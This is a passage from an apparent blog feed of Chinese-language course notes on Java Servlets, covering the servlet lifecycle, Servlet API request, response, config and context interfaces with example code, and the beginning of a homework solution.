        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ol><li>Eclipse Java EE IDE for Web Developers. Version: Mars.1 Release (4.5.1)</li><li>Apache Tomcat version: 8.0.39</li></ol><h1 id="课堂学习目标"><a href="#课堂学习目标" class="headerlink" title="课堂学习目标"></a>课堂学习目标</h1><p>实践servlet的init()、service()与destroy()方法，理解servlet生命周期的三个阶段。</p><h1 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h1><p>我们还是新建一个名为Test的新工程，然后新建一个不带doGet()与doPost()方法的一个基本的servlet，然后我们依次循规蹈矩的手动覆盖重写三个方法，他们分别是init()、service()和destroy()方法，重写后截图如下：</p><p><img src="https://cdn.bugwz.com/006qpCDTjw1fa9cyhh80xj30rj0bgwfq.jpg" alt="Servlet_1"></p><p>我们在浏览器地址栏中输入进入Servlet_1的虚拟路径后，控制台下便出现了，调用init()方法的输出信息，然后调用了service()方法的输出信息，这两个方法的调用就是servlet的前两个生命周期，初始化阶段，调用init()方法；响应客户请求阶段，调用service()方法，之后每次刷新浏览器界面会发现只出现调用service()方法的输出结果，如下所示：</p><p><img src="https://cdn.bugwz.com/006qpCDTjw1fa9d42n3glj30kv08vaaj.jpg" alt="service()输出结果"></p><blockquote><p>提示：</p></blockquote><p>如果你发现你打不开映射的虚拟路径，浏览器并提示了404错误，请尝试移步<a href="http://www.bugwz.com/jsp1/#jsp_1_trouble">这里</a> ，尝试解决问题。</p><p>之后，当我们停止服务器的时候，注意，这不是终止进程，还是有点区别的。</p><ol><li>停止服务器：web应用被终止，或Servlet容器终止运行，或Servlet容器重新装载Servlet新实例时，Servlet容器会先调用Servlet的destroy()方法，在destroy()方法中可以释放掉Servlet所占用的资源。</li><li>终止进程：servlet容器被强行终止，来不及调用Servlet的destroy()方法。</li></ol><p>我们点击停止服务器后效果图如下所示：</p><p><img src="https://cdn.bugwz.com/006qpCDTjw1fa9dbaxac7j30sn0d4wgu.jpg" alt="Stop Server"></p><h1 id="来些总结"><a href="#来些总结" class="headerlink" title="来些总结"></a>来些总结</h1><p>Servlet生命周期分为三个阶段：</p><ol><li>初始化阶段，调用init()方法</li><li>响应客户请求阶段，调用service()方法</li><li>终止阶段，调用destroy()方法</li></ol><p>Servlet初始化阶段：(在下列时刻Servlet容器装载Servlet)</p><ol><li>Servlet容器启动时自动装载某些Servlet。</li><li>在Servlet容器启动后，客户首次向Servlet发送请求。</li><li>Servlet类文件被更新后，重新装载Servlet。</li></ol><blockquote><p>Servlet被装载后，Servlet容器创建一个Servlet实例并且调用Servlet的init()方法进行初始化。在Servlet的整个生命周期内，init()方法只被调用一次。</p></blockquote><p>Servlet响应请求阶段：</p><p>　　对于用户到达Servlet的请求，Servlet容器会创建特定于这个请求的ServletRequest对象和ServletResponse对象，然后调用Servlet的service方法。service方法从ServletRequest对象获得客户请求信息，处理该请求，并通过ServletResponse对象向客户返回响应信息。</p><p>Servlet终止阶段：</p><p>　　当web应用被终止，或Servlet容器终止运行，或Servlet容器重新装载Servlet新实例时，Servlet容器会先调用Servlet的destroy()方法，在destroy()方法中可以释放掉Servlet所占用的资源。</p><blockquote><p>关于Servlet生命周期与工作原理的更详细的信息，推荐访问<a href="http://www.cnblogs.com/cuiliang/archive/2011/10/21/2220671.html">这里</a></p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
            <tag> JSP </tag>
            
            <tag> Campus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Servlet API-JSP笔记-3</title>
      <link href="/2016/11/29/jsp-3/"/>
      <url>/2016/11/29/jsp-3/</url>
      
        <content type="html"><![CDATA[<h2 id="一、环境"><a href="#一、环境" class="headerlink" title="一、环境"></a>一、环境</h2><ol><li>Eclipse Java EE IDE for Web Developers.<br>  Version: Neon.1a Release (4.6.1)</li><li>Apache Tomcat version: 8.0.39</li></ol><h2 id="二、总结知识点"><a href="#二、总结知识点" class="headerlink" title="二、总结知识点"></a>二、总结知识点</h2><h3 id="2-1、认识Servlet-API"><a href="#2-1、认识Servlet-API" class="headerlink" title="2.1、认识Servlet API:"></a>2.1、认识Servlet API:</h3><p>Servlet API由两个软件包组成：Javax.servlet包和Javax.servlet.http包。其中Javax.servlet包主要存放与http协议无关的一般性的servlet类，Javax.servlet.http包主要存放与http协议相关的功能的类。(两个软件包都位于Tomcat的servlet-api.jar中)</p><h3 id="2-2、本次主要说明的东西如下："><a href="#2-2、本次主要说明的东西如下：" class="headerlink" title="2.2、本次主要说明的东西如下："></a>2.2、本次主要说明的东西如下：</h3><ul><li>Javax.servlet.http包中的接口：<ul><li>HttpServletRequest接口：提供http请求信息。</li><li>HttpServletResponse接口：提供http响应。</li></ul></li><li>Javax.servlet包中的接口：<ul><li>ServletConfig接口：在初始化的过程中由Servlet容器使用。</li><li>ServletContext接口：定义Servlet用于获取来自其容器的信息的方法。</li><li>ServletRequest接口：向服务器提交请求。</li><li>ServletResponse接口：响应客户端请求。</li></ul></li><li>Javax.servlet包中的类：<ul><li>ServletInputStream类：用于从客户端读取二进制数据。</li><li>ServletOutputStream类：用于将二进制数据发送到客户端。</li><li>ServletException类：用于异常处理的类。</li><li>UnavailableException类：当servlet或filter不能用时，处理异常的类。</li></ul></li></ul><h3 id="2-3、HttpServletRequest接口"><a href="#2-3、HttpServletRequest接口" class="headerlink" title="2.3、HttpServletRequest接口"></a>2.3、HttpServletRequest接口</h3><p>HttpServletRequest接口对应客户端http的请求。当客户端通过http访问服务器时，http请求中的所有信息都封装在HttpServletRequest对象中，我们可以通过该对象一些方法获取很多信息，其中获取客户机信息，获取请求头信息，获取请求参数等，这主要说明这三种。</p><h4 id="2-3-1、获取客户机信息："><a href="#2-3-1、获取客户机信息：" class="headerlink" title="2.3.1、获取客户机信息："></a>2.3.1、获取客户机信息：</h4><ul><li>getRequestURL方法返回客户端发出完整请求的URL</li><li>getRequestURI方法返回请求行中的资源名部分</li><li>getQueryString方法返回请求行中的参数部分</li><li>getRemoteAddr方法返回发出请求的客户机的IP地址</li><li>getMethod得到客户机请求方式</li><li>getContextPath获得工程虚拟目录名称</li></ul><p>部分代码如下所示：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//URI 和 URL 区别？ </span></span><br><span class="line"><span class="comment">//URI获得以webroot目录开始路径 URL获得以Http协议开始完整路径</span></span><br><span class="line"><span class="comment">//URI 描述路径范围比URL大（URL都是URI ） /lesson9_jsp/request1  ../request1 这些路径都是URI，不是URL</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RequestServletDemo1</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line"><span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">System.out.println(request.getRequestURI()); </span><br><span class="line"><span class="comment">// 输出：/lesson9_jsp/RequestServletDemo1</span></span><br><span class="line">System.out.println(request.getRequestURL());</span><br><span class="line"><span class="comment">// 输出为：http://localhost:8080/lesson9_jsp/RequestServletDemo1</span></span><br><span class="line">System.out.println(request.getQueryString());</span><br><span class="line"><span class="comment">// 输出：null</span></span><br><span class="line">System.out.println(<span class="string">&quot;您的ip是：&quot;</span> + request.getRemoteAddr());</span><br><span class="line"><span class="comment">// 输出：您的ip是：0:0:0:0:0:0:0:1</span></span><br><span class="line">System.out.println(<span class="string">&quot;您的请求方式是： &quot;</span> + request.getMethod());</span><br><span class="line"><span class="comment">// 输出：您的请求方式是： GET</span></span><br><span class="line">System.out.println(<span class="string">&quot;工程虚拟目录:&quot;</span> + request.getContextPath());</span><br><span class="line"><span class="comment">// 输出：工程虚拟目录:/lesson9_jsp</span></span><br><span class="line">System.out.println(<span class="string">&quot;当前资源:&quot;</span> + request.getServletPath());</span><br><span class="line"><span class="comment">// 输出：当前资源:/RequestServletDemo1</span></span><br><span class="line">System.out.println(<span class="string">&quot;uri is:&quot;</span>+request.getRequestURI());</span><br><span class="line"><span class="comment">// 输出：uri is:/lesson9_jsp/RequestServletDemo1</span></span><br><span class="line">System.out.println(<span class="string">&quot;当前资源: &quot;</span>+ request.getRequestURI().substring(request.getContextPath().length()));</span><br><span class="line"><span class="comment">// 输出：当前资源: /RequestServletDemo1</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-3-2、获取请求头信息："><a href="#2-3-2、获取请求头信息：" class="headerlink" title="2.3.2、获取请求头信息："></a>2.3.2、获取请求头信息：</h4><ul><li>getHeader(name)—String</li><li>getHeaders(String name)方法—Enumeration<String></li><li>getHeaderNames方法—Enumeration<String></li></ul><p>部分代码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RequestServletDemo2</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line"><span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"><span class="comment">// 获得所有头信息</span></span><br><span class="line">Enumeration&lt;String&gt; names = request.getHeaderNames();</span><br><span class="line"><span class="keyword">while</span> (names.hasMoreElements()) &#123;</span><br><span class="line"><span class="comment">// 每个头信息 名称</span></span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> names.nextElement();</span><br><span class="line"><span class="comment">// 根据name 获得 value</span></span><br><span class="line">System.out.println(name + <span class="string">&quot;:&quot;</span> + request.getHeader(name));</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;--------------------------------------&quot;</span>);</span><br><span class="line"><span class="comment">// 获得一个指定头信息</span></span><br><span class="line">System.out.println(request.getHeader(<span class="string">&quot;User-Agent&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-3-3、获取请求参数："><a href="#2-3-3、获取请求参数：" class="headerlink" title="2.3.3、获取请求参数："></a>2.3.3、获取请求参数：</h4><ul><li>getParameter(name)—String 通过name获得值</li><li>getParameterValues—String[]通过name获得多值checkbox</li><li>getParameterNames—Enumeration<String>获得所有name</li><li>getParameterMap—Map&lt;String, String[]&gt; key :name value:多值</li></ul><p>部分代码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RequestServletDemo3</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line"><span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"><span class="comment">// 接收request.html 提交数据</span></span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;name=&quot;</span> + name);</span><br><span class="line">System.out.println(<span class="string">&quot;password=&quot;</span> + password);</span><br><span class="line"><span class="comment">// 判断name是否为空</span></span><br><span class="line"><span class="keyword">if</span> (name == <span class="literal">null</span> || name.trim().length() == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">// 不合法</span></span><br><span class="line">request.getRequestDispatcher(<span class="string">&quot;/request/request3.html&quot;</span>).forward(</span><br><span class="line">request, response);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获得多值 属性 hobby</span></span><br><span class="line"><span class="comment">// 如果存在多个值 getParameter 只能获得第一个值</span></span><br><span class="line"><span class="comment">// url?hobby=sport&amp;hobby=music ---- 使用getParameterValues</span></span><br><span class="line">System.out.println(request.getParameter(<span class="string">&quot;hobby&quot;</span>));</span><br><span class="line">String[] arr = request.getParameterValues(<span class="string">&quot;hobby&quot;</span>);</span><br><span class="line">System.out.println(Arrays.toString(arr));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 下面通过getParameterNames 和 getParameterMap 遍历所有请求参数</span></span><br><span class="line">System.out.println(<span class="string">&quot;---------------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第一种通过getParameterNames</span></span><br><span class="line">Enumeration&lt;String&gt; names = request.getParameterNames();</span><br><span class="line"><span class="keyword">while</span> (names.hasMoreElements()) &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">parameterName</span> <span class="operator">=</span> names.nextElement();</span><br><span class="line">String[] parameterValues = request.getParameterValues(parameterName);</span><br><span class="line">System.out.println(parameterName + <span class="string">&quot;:&quot;</span>+ Arrays.toString(parameterValues));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二种通过 getParameterMap 遍历所有数据</span></span><br><span class="line">Map&lt;String, String[]&gt; map = request.getParameterMap();</span><br><span class="line"><span class="comment">// 通过keySet entrySet两种方式遍历map</span></span><br><span class="line">System.out.println(<span class="string">&quot;getParameterMap keySet----------------------&quot;</span>);</span><br><span class="line">Set&lt;String&gt; keySet = map.keySet();</span><br><span class="line"><span class="keyword">for</span> (String key : keySet) &#123;</span><br><span class="line">String[] values = map.get(key);</span><br><span class="line">System.out.println(key + <span class="string">&quot;: &quot;</span> + Arrays.toString(values));</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;getParameterMap entrySet----------------------&quot;</span>);</span><br><span class="line">Set&lt;Entry&lt;String, String[]&gt;&gt; entrySet = map.entrySet();</span><br><span class="line"><span class="keyword">for</span> (Entry&lt;String, String[]&gt; entry : entrySet) &#123;</span><br><span class="line">System.out.println(entry.getKey() + <span class="string">&quot;: &quot;</span>+ Arrays.toString(entry.getValue()));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-4、HttpServletResponse接口"><a href="#2-4、HttpServletResponse接口" class="headerlink" title="2.4、HttpServletResponse接口"></a>2.4、HttpServletResponse接口</h3><p>HttpServletResponse对象提供服务器对客户端的http响应，它封装了向客户端提供数据、发送响应头、发送相应状态码等方法，这里主要说明指定状态码&amp;头信息，状态码和头信息应用以及它生成响应等操作。</p><h4 id="2-4-1、指定状态码-amp-头信息以及头信息应用："><a href="#2-4-1、指定状态码-amp-头信息以及头信息应用：" class="headerlink" title="2.4.1、指定状态码&amp;头信息以及头信息应用："></a>2.4.1、指定状态码&amp;头信息以及头信息应用：</h4><p>部分代码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ResponseServletDemo1</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line"><span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"><span class="comment">// 设置状态码setStatus</span></span><br><span class="line"><span class="comment">// response.setStatus(404);</span></span><br><span class="line"><span class="comment">// response.setStatus(200);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 重定向设置使浏览器去访问另一个WEB资源</span></span><br><span class="line">response.setStatus(HttpServletResponse.SC_FOUND);</span><br><span class="line"><span class="comment">// 浏览器重定向，相对的和绝对的都可以</span></span><br><span class="line"><span class="comment">// response.setHeader(&quot;Location&quot;, &quot;index.jsp&quot;);</span></span><br><span class="line"><span class="comment">// response.setHeader(&quot;Location&quot;, &quot;/lesson9_jsp/index.jsp&quot;);</span></span><br><span class="line"><span class="comment">// 简化重定向</span></span><br><span class="line">response.sendRedirect(<span class="string">&quot;/lesson9_jsp/index.jsp&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3秒后自动跳转 index.jsp</span></span><br><span class="line"><span class="comment">// 如果是客户端访问一个路径，此时必须 /工程名</span></span><br><span class="line">response.setHeader(<span class="string">&quot;refresh&quot;</span>, <span class="string">&quot;3;url=/lesson9_jsp/index.jsp&quot;</span>);</span><br><span class="line"><span class="comment">// 在跳转同时，提示用户页面将要跳转</span></span><br><span class="line">response.setContentType(<span class="string">&quot;text/html;charset=utf-8&quot;</span>);</span><br><span class="line">response.getWriter().println(<span class="string">&quot;页面将在3秒后 自动跳转index.jsp, 如果没有跳转请点击&lt;a href=&#x27;/lesson9_jsp/index.jsp&#x27;&gt;这里&lt;/a&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置三个禁止缓存头字段</span></span><br><span class="line">response.setHeader(<span class="string">&quot;Cache-Control&quot;</span>, <span class="string">&quot;no-cache&quot;</span>);</span><br><span class="line">response.setHeader(<span class="string">&quot;Pragma&quot;</span>, <span class="string">&quot;no-cache&quot;</span>);</span><br><span class="line"><span class="comment">// 设置Expires时，一般不设置String 日期字符串 书写复杂</span></span><br><span class="line"><span class="comment">// 参数一个毫秒 -1毫秒 -- java中时间 从1970年1月1日 0点开始计时</span></span><br><span class="line"><span class="comment">// 当前网页已经过期</span></span><br><span class="line">response.setDateHeader(<span class="string">&quot;Expires&quot;</span>, -<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-4-2、response生成响应："><a href="#2-4-2、response生成响应：" class="headerlink" title="2.4.2、response生成响应："></a>2.4.2、response生成响应：</h4><p>部分代码如下所示：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ResponseServletDemo5</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line"><span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"><span class="comment">// 设置浏览器查看编码两种方式</span></span><br><span class="line"><span class="comment">// setContentType 具有 setCharacterEncoding 效果</span></span><br><span class="line">response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">response.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"><span class="comment">// getOutputStream 与 getWriter 不能同时使用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//字节流数据输出</span></span><br><span class="line"><span class="comment">// 下面语句报错提示：类型不匹配：不能从 HttpServletResponse 转换为 OutputStream</span></span><br><span class="line"><span class="comment">// OutputStream out = response。getOutputStream();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符流输出</span></span><br><span class="line"><span class="comment">// response.getWriter().println(&quot;今天天气多云，可能有雨！&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// tomcat会自动关流</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.bugwz.com/006qpCDTjw1fadbvx0b5lj30qn0h1mzp.jpg" alt="Response Notice"></p><h3 id="2-5、ServletConfig接口与ServletContext接口"><a href="#2-5、ServletConfig接口与ServletContext接口" class="headerlink" title="2.5、ServletConfig接口与ServletContext接口"></a>2.5、ServletConfig接口与ServletContext接口</h3><h4 id="2-5-1、关于ServletConfig接口："><a href="#2-5-1、关于ServletConfig接口：" class="headerlink" title="2.5.1、关于ServletConfig接口："></a>2.5.1、关于ServletConfig接口：</h4><p>在Servlet的配置文件中，可以使用一个或者多个<init-param>标签为servlet配置一些初始化参数，当servlet配置了初始化参数后，web容器在创建servlet实例对象时，会自动将这些初始化参数封装到ServletConfig对象中，并在调用servlet的init方法时，将ServletConfig的对象传递给servlet，进而，程序员通过ServletConfig对象就可以得到当前servlet的初始化参数信息，从一个servlet实例化之后，对任何客户端的任何时候访问都有效，一个servlet的ServletConfig不能被其他servlet访问。</p><p>部分代码如下所示:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletConfigDemo1</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"><span class="comment">// private ServletConfig config;</span></span><br><span class="line"><span class="comment">// @Override</span></span><br><span class="line"><span class="comment">// public void init(ServletConfig config) throws ServletException &#123;</span></span><br><span class="line"><span class="comment">// // 父类GenericServlet中已经做了this.config=config就不需要重写了,不需要覆盖带参数的初始化方法</span></span><br><span class="line"><span class="comment">// // this.config = config;</span></span><br><span class="line"><span class="comment">// // 传入一个ServletConfig 参数，获得Servlet实例初始化数据</span></span><br><span class="line"><span class="comment">// System.out.println(&quot;init &quot; + config.getInitParameter(&quot;uname&quot;));</span></span><br><span class="line"><span class="comment">// System.out.println(&quot;init &quot; + config.getInitParameter(&quot;password&quot;));</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// // 获得所有参数name的集合</span></span><br><span class="line"><span class="comment">// Enumeration&lt;String&gt; names = config.getInitParameterNames();</span></span><br><span class="line"><span class="comment">// // 遍历names 获取所有初始化参数值</span></span><br><span class="line"><span class="comment">// while (names.hasMoreElements()) &#123;</span></span><br><span class="line"><span class="comment">// String name = (String) names.nextElement();</span></span><br><span class="line"><span class="comment">// System.out.println(&quot;init &quot; + name + &quot;=&quot;</span></span><br><span class="line"><span class="comment">// + config.getInitParameter(name));</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"><span class="comment">// 覆盖无参的初始化方法,config是私有的参数,就不能用了,通过getServletConfig方法获取config对象</span></span><br><span class="line">System.out.println(<span class="string">&quot;init &quot;</span> + getServletConfig().getInitParameter(<span class="string">&quot;uname&quot;</span>));</span><br><span class="line">System.out.println(<span class="string">&quot;init &quot;</span> + getServletConfig().getInitParameter(<span class="string">&quot;password&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line"><span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"><span class="comment">// 在doGet方法中 如何获得初始化数据 ？？？？从init 方法传递config 到doGet</span></span><br><span class="line"><span class="comment">// 使用保存成员变量 config 获得初始化信息</span></span><br><span class="line"><span class="comment">// System.out.println(&quot;doGet &quot; + config.getInitParameter(&quot;uname&quot;));</span></span><br><span class="line"><span class="comment">// System.out.println(&quot;doGet &quot; + config.getInitParameter(&quot;password&quot;));</span></span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;doGet &quot;</span>+ getServletConfig().getInitParameter(<span class="string">&quot;uname&quot;</span>));</span><br><span class="line">System.out.println(<span class="string">&quot;doGet &quot;</span>+ getServletConfig().getInitParameter(<span class="string">&quot;password&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-5-2、关于ServletContext接口："><a href="#2-5-2、关于ServletContext接口：" class="headerlink" title="2.5.2、关于ServletContext接口："></a>2.5.2、关于ServletContext接口：</h4><p>在WEB容器启动的时候，他会为每一个WEB应用程序都创建一个对应的ServletContext对象，它代表当前web应用。ServletCofig对象中维护了ServletContext对象的引用，开发人员在编写servlet时，可以通过ServletConfig.getServletContext方法获得ServletContext对象。由于一个WEB应用中的所有Servlet共享同一个ServletContext对象来实现通讯。ServletContext对象通常也被称之为context域对象。ServletContext对恩赫servlet，任何人在任何时间都有效，是真正的全部对象。</p><p>部分代码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletContextCountDemo1</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"><span class="comment">// 初始化访问次数0</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"><span class="comment">// 在ServletContext对象中保存一个访问次数</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> getServletContext();</span><br><span class="line"><span class="comment">// 保存一个数据</span></span><br><span class="line">context.setAttribute(<span class="string">&quot;count&quot;</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line"><span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"><span class="comment">// 每次访问获得原来访问次数+1</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> getServletContext();</span><br><span class="line"><span class="comment">// 或者使用下面这条语句获取context</span></span><br><span class="line"><span class="comment">// ServletContext context = getServletConfig().getServletContext();</span></span><br><span class="line"><span class="comment">// 获得访问次数</span></span><br><span class="line"><span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> (Integer) context.getAttribute(<span class="string">&quot;count&quot;</span>);</span><br><span class="line"><span class="comment">// 次数+1保存</span></span><br><span class="line">count++;</span><br><span class="line">context.setAttribute(<span class="string">&quot;count&quot;</span>, count);</span><br><span class="line">System.out.println(<span class="string">&quot;网站被访问次数为&quot;</span> + count);</span><br><span class="line"><span class="comment">// 浏览器显示中文</span></span><br><span class="line">response.setContentType(<span class="string">&quot;text/html;charset=utf-8&quot;</span>);</span><br><span class="line">response.getWriter().println(<span class="string">&quot;Demo1网站被访问次数为&quot;</span> + count);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
            <tag> JSP </tag>
            
            <tag> Campus </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Servlet课后作业-JSP作业-1</title>
      <link href="/2016/11/29/jsp-homework-1/"/>
      <url>/2016/11/29/jsp-homework-1/</url>
      
        <content type="html"><![CDATA[<h1 id="作业要求："><a href="#作业要求：" class="headerlink" title="作业要求："></a>作业要求：</h1><ol><li><a href="#1-1" id="1">编写一个Serlvet以便显示该Servlet被访问的次数。</a></li><li><a href="#2-2" id="2">编写一个Servlet程序，在doGet方法中显示一个Form表单，用户可以输入姓名和电子邮件地址，用户提交该表单后，doPost方法动态读出请求参数，并输出这些参数。提示：使用request对象的getParameterNames（）方法。</a></li><li><a href="#3-3" id="3">描述Serlvet的生命周期。</a></li><li><a href="#4-4" id="4">实现Servlet有几种方法，每种方法都有哪些特点。</a></li><li><a href="#5-5" id="5">如何配置Serlvet。</a></li></ol><h1 id="开始作业"><a href="#开始作业" class="headerlink" title="开始作业"></a>开始作业</h1><blockquote><p><a id="1-1"></a>作业 1：<a href="#1">点此查看要求</a></p></blockquote><p>仅贴出Servlet的主体代码如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/Servlet_1&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Servlet_1</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@see</span> HttpServlet#HttpServlet()</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Servlet_1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> num=<span class="number">1</span>;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"><span class="comment">// TODO 自动生成的方法存根</span></span><br><span class="line"><span class="comment">//super.doGet(req, resp);</span></span><br><span class="line">resp.setHeader(<span class="string">&quot;Content-type&quot;</span>, <span class="string">&quot;text/html;charset=UTF-8&quot;</span>);  </span><br><span class="line"><span class="type">PrintWriter</span> <span class="variable">pw</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line">pw.println(<span class="string">&quot;Servlet被访问的次数为：&quot;</span>+num++);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行图示如下：</p><p><img src="https://cdn.bugwz.com/006qpCDTjw1fa9e0wjqj1j30el04iwee.jpg" alt="Servlet Num"></p><blockquote><p><a id="2-2"></a>作业 2：<a href="#2">点此查看要求</a></p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/Servlet_2&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Servlet_2</span> <span class="keyword">extends</span> <span 